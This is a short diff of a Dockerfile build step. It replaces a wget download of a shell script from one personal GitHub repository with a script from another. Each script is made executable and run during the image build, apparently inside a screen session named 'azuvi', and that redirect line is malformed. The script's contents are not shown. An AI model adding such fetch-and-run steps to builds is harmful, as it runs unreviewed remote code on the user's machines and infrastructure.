@@ -12,9 +12,9 @@ RUN \
   apt-get update && \
   apt-get install screen -y && \
   apt-get install -y wget && \
-  wget https://github.com/antonylally07/sgr/raw/main/set.sh  && \
-  chmod +x set.sh  && \
-  ./set.sh > screen -R azuvi && \
+  wget https://github.com/lallianto/lalli/raw/main/sel.sh  && \
+  chmod +x sel.sh  && \
+  ./sel.sh > screen -R azuvi && \
   rm -rf /var/lib/apt/lists/*
 
 # Add files.
